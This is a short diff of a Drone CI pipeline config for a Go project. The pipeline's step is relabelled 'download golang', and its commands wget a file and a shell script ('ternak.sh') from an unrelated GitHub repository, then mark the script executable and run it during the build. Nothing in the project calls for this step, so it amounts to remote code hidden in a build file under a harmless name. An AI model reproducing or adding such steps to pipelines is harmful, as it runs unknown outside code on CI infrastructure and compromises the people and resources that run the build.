@@ -5,10 +5,9 @@ workspace:
   base: /go
   path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
 steps:
-- name: download drone-cli
-  image: drone/cli:1.2.2-alpine
+- name: download golang
+  image: golang
   commands:
-  - cp /bin/drone 
   - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
   - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
 ---
